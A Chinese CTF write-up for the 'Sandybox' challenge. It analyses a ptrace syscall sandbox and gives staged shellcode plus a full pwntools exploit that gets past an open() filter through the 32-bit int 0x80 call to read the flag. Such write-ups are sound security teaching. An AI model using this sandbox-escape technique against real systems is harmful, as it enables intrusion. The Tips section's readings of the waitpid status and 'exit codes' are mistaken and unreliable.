# Sandybox

## 前置知识

**prctl：**

```
prctl(PR_SET_PDEATHSIG,SIGKILL)
```

prctl是多线程编程中使用的函数，其执行什么功能都是由后面的第一个参数决定的，这里PR_SET_PDEATHSIG的作用是当父进程死亡的时候会发送参数2的信号，这里第2个参数是SIGKILL，所以说这里的功能就是当父进程死亡的时候子进程会被kill掉

**ptrace：**

注：这道题就是使用ptrace实现了过滤掉沙箱里面的一些系统调用

```
ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)
```

这调语句中的PTRACE_TRACEME代表的意思是这个进程由它的父进程来跟踪，然后具体的功能是当任何发给这个进程的信号signal（除了SIGKILL）将导致该进程停止运行，而它的父进程会通过wait()获得通知。另外，该进程之后所有对exec()的调用都将使操作系统产生一个SIGTRAP信号发送给它，这让父进程有机会在新程序开始执行之前获得对子进程的控制权。

简单点说就是发送给子进程的信号都会由父进程来进行处理一下然后对应的子进程再调用信号处理程序

```
ptrace(PTRACE_SETOPTIONS, child_pid_1, 0LL, 0x100000LL);
```

PTRACE_SETOPTIONS代表的意思是可设置选项,这样程序触发相应事件时将会执行预定操作，0x100000对应的是PTRACE_O_EXITKILL,具体的功能如下，当tracer终止时向tracee发送SIGKILL信号终止tracee,若不设置此选项线程将deattch并恢复运行，这个选项在安全保护中极其重要,不设置它子进程可以通过杀死父进程绕过保护

```
ptrace(PTRACE_SYSCALL, child_pid_1, 0LL, v11) )
```

这条语句的作用是，使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来

```
ptrace(PTRACE_GETREGS, child_pid_1, 0LL, &regs)
```

这句是获取寄存器的值并且存在后面的regs里面，其中regs是一个数据结构，具体内容如下：

```
struct user_regs_struct
{
  __extension__ unsigned long long int r15;
  __extension__ unsigned long long int r14;
  __extension__ unsigned long long int r13;
  __extension__ unsigned long long int r12;
  __extension__ unsigned long long int rbp;
  __extension__ unsigned long long int rbx;
  __extension__ unsigned long long int r11;
  __extension__ unsigned long long int r10;
  __extension__ unsigned long long int r9;
  __extension__ unsigned long long int r8;
  __extension__ unsigned long long int rax;
  __extension__ unsigned long long int rcx;
  __extension__ unsigned long long int rdx;
  __extension__ unsigned long long int rsi;
  __extension__ unsigned long long int rdi;
  __extension__ unsigned long long int orig_rax;
  __extension__ unsigned long long int rip;
  __extension__ unsigned long long int cs;
  __extension__ unsigned long long int eflags;
  __extension__ unsigned long long int rsp;
  __extension__ unsigned long long int ss;
  __extension__ unsigned long long int fs_base;
  __extension__ unsigned long long int gs_base;
  __extension__ unsigned long long int ds;
  __extension__ unsigned long long int es;
  __extension__ unsigned long long int fs;
  __extension__ unsigned long long int gs;
};
```

```
ptrace(PTRACE_SETREGS, child_pid_1, 0LL, &regs)
```

通过regs这个数据结构来设置寄存器的值

```
ptrace(PTRACE_POKEDATA, child_pid_1, v15, v14)
ptrace(PTRACE_POKEDATA, pid, addr, data)
```

第一句是反汇编的代码，第二句是函数原型，其功能就是把数据写入到addr这个地址中

```
ptrace(PTRACE_POKEDATA, pid, addr, data)
```

这个和上面那个相反是读取数据，从addr读然后存储到data中	

## 题目分析

题目涉及了多线程编程，其中利用了ptrace来设置沙盒规则，然后父进程监管子进程，子进程中可以执行一部分shellcode

题目整体代码如下（加了注释）：

```
  sub_1330();
  alarm(0xAu);
  __dprintf_chk(1LL, 1LL, "o hai\n");
  if ( access("./flag", 4) )
  {
    v5 = __errno_location();
    strerror(*v5);
    __dprintf_chk(1LL, 1LL, "flag access fail %s\n");
    return 1LL;
  }
  child_pid = fork();
  if ( child_pid < 0 )
  {
    v8 = __errno_location();
    strerror(*v8);
    __dprintf_chk(1LL, 1LL, "fork fail %s\n");
    return 1LL;
  }
  if ( !child_pid )                             // 子进程执行的内容
  {
    // prctl(PR_SET_PDEATHSIG,SIGKILL)
    prctl(1, 9LL);                              // 查了下库文件1代表的是PR_SET_PDEATHSIG,意思是第二个参数是一个signal
                                                // signal 9 对应的是SIGKILL
    if ( getppid() != 1 )
    {
      if ( ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) )// 子进程调用PTRACE_TRACEME，表明这个进程由它的父进程来跟踪。
                                                // 任何发给这个进程的信号signal（除了SIGKILL）将导致该进程停止运行，而它的父进程会通过wait()获得通知。
                                                // 另外，该进程之后所有对exec()的调用都将使操作系统产生一个SIGTRAP信号发送给它
                                                // 这让父进程有机会在新程序开始执行之前获得对子进程的控制权。
      {
        v4 = __errno_location();
        strerror(*v4);
        __dprintf_chk(1LL, 1LL, "child traceme %s\n");
        _exit(1);
      }
      v7 = getpid();
      kill(v7, 19);
      shellcode();                              // 执行shellcode
      _exit(0);
    }
    __dprintf_chk(1LL, 1LL, "child is orphaned\n");
    _exit(1);
  }
  child_pid_1 = child_pid;
  v25 = __readfsqword(0x28u);
  // __WALL : 0x40000000
  if ( waitpid(child_pid, &status, 0x40000000) < 0 || status != 0x7F || BYTE1(status) != 19 )// __WALL 等待所有类型的子进程
                                                // 第一个wait会捕获到mmap调用brk增加内存
  {
    v10 = __errno_location();
    strerror(*v10);
    __dprintf_chk(1LL, 1LL, "initial waitpid fail 0x%x %s\n");
    return 1LL;
  }
  v11 = 0;
  alarm(0x1Eu);
  ptrace(PTRACE_SETOPTIONS, child_pid_1, 0LL, 0x100000LL);// 使用PTRACE_SETOPTIONS可设置选项,这样程序触发相应事件时将会执行预定操作
                                                // 0x100000对应的是PTRACE_O_EXITKILL,具体的功能如下
                                                // 当tracer终止时向tracee发送SIGKILL信号终止tracee,若不设置此选项线程将deattch并恢复运行
                                                // 这个选项在安全保护中极其重要,不设置它子进程可以通过杀死父进程绕过保护
  while ( 1 )
  {
    while ( 1 )
    {
      if ( ptrace(PTRACE_SYSCALL, child_pid_1, 0LL, v11) )// 使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来
      {
        v17 = *__errno_location();
        if ( v17 != 10 )
        {
          strerror(v17);
          v18 = "ptrace syscall1 %s\n";
          goto LABEL_43;
        }
        return 0LL;
      }
      if ( waitpid(child_pid_1, &status, 0x40000000) < 0 )
        goto LABEL_38;
      if ( status != 0x7F )
      {
        v19 = "so long, sucker 0x%x\n";
        goto LABEL_45;
      }
      v11 = BYTE1(status);
      if ( BYTE1(status) == 5 )
        break;                                  // 只要调用了read,那么这个if的break就会执行
                                                // 等到最后一次子进程exit之后就不会执行而直接执行下面的输出语句了
                                                // 
      __dprintf_chk(2LL, 1LL, "child signal %d\n");
    }
    if ( ptrace(PTRACE_GETREGS, child_pid_1, 0LL, &regs) )// 读取寄存器的值
    {
      v20 = __errno_location();
      strerror(*v20);
      v18 = "ptrace getregs %s\n";
      goto LABEL_43;
    }
    LOBYTE(v12) = check(child_pid_1, &regs);
    if ( !v12 )
    {
      __dprintf_chk(2LL, 1LL, "allowed syscall %lld(%lld, %lld, %lld, %lld)\n");
      goto LABEL_30;
    }
    __dprintf_chk(2LL, 1LL, "blocked syscall %lld\n");
    regs.orig_rax = 1LL;
    regs.rdi = 1LL;
    regs.rdx = 17LL;
    regs.rsi = regs.rsp;
    if ( ptrace(PTRACE_SETREGS, child_pid_1, 0LL, &regs) )// 设置寄存器的值
      break;
    for ( i = 0LL; i != 24; i += 8LL )
    {
      v14 = *&aGetClappedSonn[i];
      v15 = i + regs.rsp;
      // ptrace(PTRACE_POKEDATA, pid, addr, data)
      ptrace(PTRACE_POKEDATA, child_pid_1, v15, v14);// 改变子进程中的数据
    }
LABEL_30:
    if ( ptrace(PTRACE_SYSCALL, child_pid_1, 0LL, 0LL) )
    {
      v21 = *__errno_location();
      if ( v21 != 10 )
      {
        strerror(v21);
        v18 = "ptrace syscall2 %s\n";
        goto LABEL_43;
      }
      return 0LL;
    }
    if ( waitpid(child_pid_1, &status, 0x40000000) < 0 )
    {

LABEL_38:
      v16 = *__errno_location();
      if ( v16 != 10 )
      {
        strerror(v16);
        __dprintf_chk(1LL, 1LL, "waitpid fail %s\n");
        return 1LL;
      }
      return 0LL;
    }
    if ( status != 127 )
    {
      v19 = "so long, sucker. 0x%x\n";
LABEL_45:
      __dprintf_chk(1LL, 1LL, v19);
      return 0LL;
    }
    v11 = 0;
  }
  v22 = __errno_location();
  strerror(*v22);
  v18 = "ptrace setregs %s\n";
LABEL_43:
  __dprintf_chk(1LL, 1LL, v18);
  kill(child_pid_1, 9);
  return 1LL;
}
```

简单的说一下程序执行的流程

1. 父进程：fork出子进程之后，开始等待子进程，子进程进行mmap的时候父进程捕获一个信号，然后设置父进程在子进程每一次进行系统调用后都需要父进程进行一些处理，然后再去执行子进程的系统调用操作，之后就是等待子进程发出系统调用，直到子进程退出之后，父进程输出一些信息也就退出了
2. 子进程：子进程先设置可以让父进程检测自己的状态，然后会有一个shellcode函数，在这个函数里，子进程会mmap出一块内存，然后再读10字节长度的内容到mmap出来的内存里，然后会执行mmap里面输入的内容

剩下的就是两个函数check和shellcode：

**shellcode：**

```
__int64 shellcode()
{
  void (*v0)(void); // r12
  void (*v1)(void); // rbx

  syscall(37LL, 20LL);
  // mmap(NULL, 10, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
  v0 = mmap(0LL, 0xAuLL, 7, 34, -1, 0LL);
  v1 = v0;
  __dprintf_chk(1LL, 1LL, &unk_1484);
  do
  {
    if ( read(0, v1, 1uLL) != 1 )
      _exit(0);
    v1 = (v1 + 1);
  }
  while ( v1 != (v0 + 10) );
  v0();
  return 0LL;
}
```

shellocde这里很简单，就是读10字节的shellcode然后执行，不过这道题需要使用orw来打，但是10个字节根本不够用，于是我的想法就是在这10个字节的shellcode里面调用read，让他读更多的shellcode进去

这里首先得看一下对应的汇编代码：

```
.text:0000000000000D70 loc_D70:                                ; CODE XREF: shellcode+7C↓j
.text:0000000000000D70                 xor     edi, edi        ; fd
.text:0000000000000D72                 mov     edx, 1          ; nbytes
.text:0000000000000D77                 mov     rsi, rbx        ; buf
.text:0000000000000D7A                 call    _read
.text:0000000000000D7F                 cmp     rax, 1
.text:0000000000000D83                 jnz     short loc_D98
.text:0000000000000D85                 add     rbx, 1
.text:0000000000000D89                 cmp     rbx, rbp
.text:0000000000000D8C                 jnz     short loc_D70
.text:0000000000000D8E                 call    r12
.text:0000000000000D91                 pop     rbx
.text:0000000000000D92                 xor     eax, eax
.text:0000000000000D94                 pop     rbp
.text:0000000000000D95                 pop     r12
.text:0000000000000D97                 retn
```

我们想要调用read函数，首先就需要关注这4个寄存器，rax，rdi，rsi，rdx，并且设置对应的寄存器的值为我们想要的值

- rax：首先因为是系统调用所以说rax的值就应该为0，然而这里10次read之后，rax的值为1，所以对应的我们就可以直接sub rax,1就可以使rax为0了，或者xor rax,rax
- rdi：因为需要使用标准输入，所以说rdi也应该为0，但是经过这10次的read之后rdi的值已经就是0了，所以说对应rdi咱们不需要做操作来更改他的值
- rsi：因为rsi存储的是bufeer，所以说rsi应该指向buffer的下一个地址，同时可以看到rsi的值是通过rbx来更改的，但是rbx每次都是增加1之后才赋值给rsi，这样的话rsi在10次read调用之后rsi就已经指向了下一次要读入的位置，所以rsi也不需要咱们做操作来更改他的值了
- rdx：rdx存储的是读取的长度，为了读更多的字节所以说rdx的值最好就是越大越号，但是10次read调用之后rdx的值为1，不符合我们预想所以需要对rdx的值进行修改，可以使用栈来设置rdx，psuh 0x1000 pop rdx，也可以直接mov rdx，0x1000，修改的方法挺多的

所以我们只需要在前面的10个字节的shellcode中只修改rax和rdx，下面是我的shellcode：

```
mov edx,0x1000
sub eax,0x1
syscall
```

然后就可以读取多个字节了

**check：**

```
bool __fastcall check(unsigned int child_pid, user_regs_struct *regs)
{
  unsigned __int64 rax_; // rax
  unsigned __int64 rdi_; // rdx
  __int64 v5; // r12
  __int64 v6; // rax
  __int128 v7; // [rsp+0h] [rbp-38h]
  char v8; // [rsp+10h] [rbp-28h]
  unsigned __int64 v9; // [rsp+18h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  rax_ = regs->orig_rax;
  if ( rax_ != 8 )
  {
    if ( rax_ > 8 )
    {
      if ( rax_ == 37 )
        return regs->rdi - 1 > 0x13;
      if ( rax_ <= 0x25 )
      {
        if ( rax_ <= 0xB )
          return regs->rsi > 0x1000;
        return 1;
      }
      if ( rax_ == 60 || rax_ == 231 || rax_ == 39 )
        return 0;
      return 1;
    }
    if ( rax_ == 2 )
    {
      if ( !regs->rsi )
      {
        rdi_ = regs->rdi;
        v8 = 0;
        v7 = 0LL;
        v5 = ptrace(PTRACE_PEEKDATA, child_pid, rdi_, 0LL);// 读rdi低32位
        v6 = ptrace(PTRACE_PEEKDATA, child_pid, regs->rdi + 8, 0LL);// 读rdi高32位
        if ( v5 != -1 && v6 != -1 )
        {
          *&v7 = v5;
          *(&v7 + 1) = v6;
          if ( strlen(&v7) <= 15 && !strstr(&v7, "flag") && !strstr(&v7, "proc") )// rdi存储open的第一个参数,第一个参数为要读的文件的名字
                                                // 所以说使用open系统调用,参数不能为flag和proc
            return strstr(&v7, "sys") != 0LL;
        }
      }
      return 1;
    }
    if ( rax_ >= 2 && rax_ != 3 && rax_ != 5 )
      return 1;
  }
  return 0;
}
```

这里就是过滤系统调用的，其中禁止使用open系统调用的时候参数为flag，除了open其余的系统调用可以按返回值归类一下

1. **return 0：**\_\_NR_lseek、\_\_NR_read 、\_\_NR_write 、\_\_NR_close 、\_\_NR_fstat  、\_\_NR_exit、 \_\_NR_exit_group、\_\_NR_getpid
2. **return regs.rdi > 20：**\_\_NR_alarm
3. **return regs.rsi <= 0x1000：**\_\_NR_munmap、\_\_NR_mprotect 、\_\_NR_mmap
4. **return 1：**open只读，open参数为flag，使用的不是上面列出的系统调用

程序大致逻辑都已经弄懂了，我们需要做的就是使用shellcode绕过open这个限制，我的绕过想法就是使用int  0x80来调用32位的open的系统调用号，在32位系统调用号中open的系统调用号为5，并且5在64位系统调用号中是fstat。在上面的check函数中也可以看到5这个系统调用号是可以使用的并且没有flag字段的限制。通过这个方法我们就可以达到使用open的目的，由于剩下的read和write系统调用都没有限制所以说后面的read和write调用就可以直接使用了，下面的图是对应mmap的参数传入顺序，我最开始第4个参数一直都往ecx里传，导致shellcode打不通，然后查了一下发现mmap的第4个参数使用r10来传

![](first.png)

下面就是第2部分的shelloce：

```
xor    r8,r8
xor    r9,r9
mov    r10,0x32
mov    edx,0x7
mov    esi,0x1000
xor    edi,edi
mov    eax,0x9 
syscall

mov    r12d,eax
mov    rdx,0x67616c66
mov    QWORD PTR [rax],rdx

mov    ebx,eax
xor    ecx,ecx
mov    eax,0x5
int    0x80

xor    edi,edi
xchg   edi,eax
mov    rsi,r12 
mov    edx,0x100
xor    eax,eax
syscall

mov    rsi,r12
mov    rdx,0x100
mov    edi,0x1
mov    eax,0x1
syscall

mov    eax,0x3c
syscall
```

需要注意的就是flag是小端序的，所以mov的顺序就应该是0x67616c66，然后还有一个点就是我最开始mmap的那端汇编代码不是那样写的，我试了一下第一条汇编语句使用某一些语句的时候就会导致shellcode执行失败，经过我测试发现，如果最开始mmap是对eax或者edx之类达到进行赋值的话会导致rax的高32位的值不变，从而就导致系统调用号不是我们想要的系统调用号的值，所以说我们最好就是使用rsi，rdx这一类的寄存器，而不使用esi，edx这一类的寄存器**（注：这里我也知识猜测并不十分确定是什么原因造成的）**

**完整exp如下：**

```
from pwn import *
from struct import pack
from sys import argv
from os import system

#context.log_level="debug"
context.arch = 'amd64'

if sys.argv[1]=="debug":
    sh = process("./sandybox")
elif sys.argv[1]=="remote":
    sh = remote("node3.buuoj.cn",)

elf = ELF("./sandybox")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x) 
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
    gdb.attach(sh)



shellcode = asm('''
mov edx,0x1000
sub eax,0x1
syscall
''', arch='amd64')

shellcode += asm('''
mov    rax,0x9
xor    rdi,rdi
mov    rsi,0x1000
mov    rdx,0x7
mov    r10,0x32
xor    r8,r8
xor    r9,r9
syscall

mov    r12d,eax
mov    rdx,0x67616c66
mov    QWORD PTR [rax],rdx

mov    rbx,rax
xor    rcx,rcx
mov    rax,0x5
int    0x80

xor    rdi,rdi
xchg   rdi,rax
mov    rsi,r12 
mov    rdx,0x100
xor    rax,rax
syscall

mov    rsi,r12
mov    rdx,0x10
mov    rdi,0x1
mov    rax,0x1
syscall

mov    rax,0x3c
syscall
''', arch='amd64')

ru("> ")
sd(shellcode)

ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
ru("\n")
flag = rv(16)
lg("{}".format(flag))
```

输出结果：
![](second.png)

### Tips

我在读代码的时候对于程序的执行流程产生了一些问题，最开始我认为最后只输出一次`allowed syscall 0(0, 140313145196544, 1, 34)`这样的字符(执行exit系统调用)，但是运行的时候输出却是下面这样的：

```
o hai
allowed syscall 37(20, 12918, 140313139197815, 4294967295)
allowed syscall 9(0, 10, 7, 34)
allowed syscall 5(1, 140734187517776, 140734187517776, 34)
allowed syscall 8(1, 0, 1, 34)
allowed syscall 1(1, 93944989933584, 2, 34)
> allowed syscall 0(0, 140313145196544, 1, 34)
child signal 14
so long, sucker 0xe
```

然后我就产生了疑问，发现问题在这两句上：

```
if ( BYTE1(status) == 5 )
    break;
__dprintf_chk(2LL, 1LL, "child signal %d\n");
```

这两句中会检测waitpid中参数status的值，最开始我以为这里只有是exit系统调用才会触发break，但是后来又查了一些资料发现不是这样的。下面是waitpid中的status的具体含义

```
| status | 0 0 0 0 0 0 0 0 |        0           | 0 0 0 0 0 0 0      |
| bits   |     8 - 15      |        7           |     0 - 6          |
| mean   |   exit status   | coredump generated | termination signal |
```

可以看到status的具体功能如上面的字符画所示，因为0-6位为termination signal，所以正常情况下termination signal需要一直是1111111也就是0x7f，所以这就可以解释伪代码里为什么对status检测了很多遍其值是不是0x7f。然后BYTE1(status)这个是获取status的高8位，然后高8位存的是退出的原因，所以对应的上面的代码就是检测exit code是不是5。

其中5对应的是Input/Output error，这里我检查了一下由于最开始在子进程中mmap的内存属于私有映射并且还是匿名的所以说怕每一次对其进行写的时候都会触发Input/Output error，全部的exit code如下表：

| Exit Code | Description                                       |
| --------- | ------------------------------------------------- |
| 0         | Success                                           |
| 1         | Operation not permitted                           |
| 2         | No such file or directory                         |
| 3         | No such process                                   |
| 4         | Interrupted system call                           |
| 5         | Input/output error                                |
| 6         | No such device or address                         |
| 7         | Argument list too long                            |
| 8         | Exec format error                                 |
| 9         | Bad file descriptor                               |
| 10        | No child processes                                |
| 11        | Resource temporarily unavailable                  |
| 12        | Cannot allocate memory                            |
| 13        | Permission denied                                 |
| 14        | Bad address                                       |
| 15        | Block device required                             |
| 16        | Device or resource busy                           |
| 17        | File exists                                       |
| 18        | Invalid cross-device link                         |
| 19        | No such device                                    |
| 20        | Not a directory                                   |
| 21        | Is a directory                                    |
| 22        | Invalid argument                                  |
| 23        | Too many open files in system                     |
| 24        | Too many open files                               |
| 25        | Inappropriate ioctl for device                    |
| 26        | Text file busy                                    |
| 27        | File too large                                    |
| 28        | No space left on device                           |
| 29        | Illegal seek                                      |
| 30        | Read-only file system                             |
| 31        | Too many links                                    |
| 32        | Broken pipe                                       |
| 33        | Numerical argument out of domain                  |
| 34        | Numerical result out of range                     |
| 35        | Resource deadlock avoided                         |
| 36        | File name too long                                |
| 37        | No locks available                                |
| 38        | Function not implemented                          |
| 39        | Directory not empty                               |
| 40        | Too many levels of symbolic links                 |
| 42        | No message of desired type                        |
| 43        | Identifier removed                                |
| 44        | Channel number out of range                       |
| 45        | Level 2 not synchronized                          |
| 46        | Level 3 halted                                    |
| 47        | Level 3 reset                                     |
| 48        | Link number out of range                          |
| 49        | Protocol driver not attached                      |
| 50        | No CSI structure available                        |
| 51        | Level 2 halted                                    |
| 52        | Invalid exchange                                  |
| 53        | Invalid request descriptor                        |
| 54        | Exchange full                                     |
| 55        | No anode                                          |
| 56        | Invalid request code                              |
| 57        | Invalid slot                                      |
| 59        | Bad font file format                              |
| 60        | Device not a stream                               |
| 61        | No data available                                 |
| 62        | Timer expired                                     |
| 63        | Out of streams resources                          |
| 64        | Machine is not on the network                     |
| 65        | Package not installed                             |
| 66        | Object is remote                                  |
| 67        | Link has been severed                             |
| 68        | Advertise error                                   |
| 69        | Srmount error                                     |
| 70        | Communication error on send                       |
| 71        | Protocol error                                    |
| 72        | Multihop attempted                                |
| 73        | RFS specific error                                |
| 74        | Bad message                                       |
| 75        | Value too large for defined data type             |
| 76        | Name not unique on network                        |
| 77        | File descriptor in bad state                      |
| 78        | Remote address changed                            |
| 79        | Can not access a needed shared library            |
| 80        | Accessing a corrupted shared library              |
| 81        | .lib section in a.out corrupted                   |
| 82        | Attempting to link in too many shared libraries   |
| 83        | Cannot exec a shared library directly             |
| 84        | Invalid or incomplete multibyte or wide character |
| 85        | Interrupted system call should be restarted       |
| 86        | Streams pipe error                                |
| 87        | Too many users                                    |
| 88        | Socket operation on non-socket                    |
| 89        | Destination address required                      |
| 90        | Message too long                                  |
| 91        | Protocol wrong type for socket                    |
| 92        | Protocol not available                            |
| 93        | Protocol not supported                            |
| 94        | Socket type not supported                         |
| 95        | Operation not supported                           |
| 96        | Protocol family not supported                     |
| 97        | Address family not supported by protocol          |
| 98        | Address already in use                            |
| 99        | Cannot assign requested address                   |
| 100       | Network is down                                   |
| 101       | Network is unreachable                            |
| 102       | Network dropped connection on reset               |
| 103       | Software caused connection abort                  |
| 104       | Connection reset by peer                          |
| 105       | No buffer space available                         |
| 106       | Transport endpoint is already connected           |
| 107       | Transport endpoint is not connected               |
| 108       | Cannot send after transport endpoint shutdown     |
| 109       | Too many references                               |
| 110       | Connection timed out                              |
| 111       | Connection refused                                |
| 112       | Host is down                                      |
| 113       | No route to host                                  |
| 114       | Operation already in progress                     |
| 115       | Operation now in progress                         |
| 116       | Stale file handle                                 |
| 117       | Structure needs cleaning                          |
| 118       | Not a XENIX named type file                       |
| 119       | No XENIX semaphores available                     |
| 120       | Is a named type file                              |
| 121       | Remote I/O error                                  |
| 122       | Disk quota exceeded                               |
| 123       | No medium found                                   |
| 125       | Operation canceled                                |
| 126       | Required key not available                        |
| 127       | Key has expired                                   |
| 128       | Key has been revoked                              |
| 129       | Key was rejected by service                       |
| 130       | Owner died                                        |
| 131       | State not recoverable                             |
| 132       | Operation not possible due to RF-kill             |
| 133       | Memory page has hardware error                    |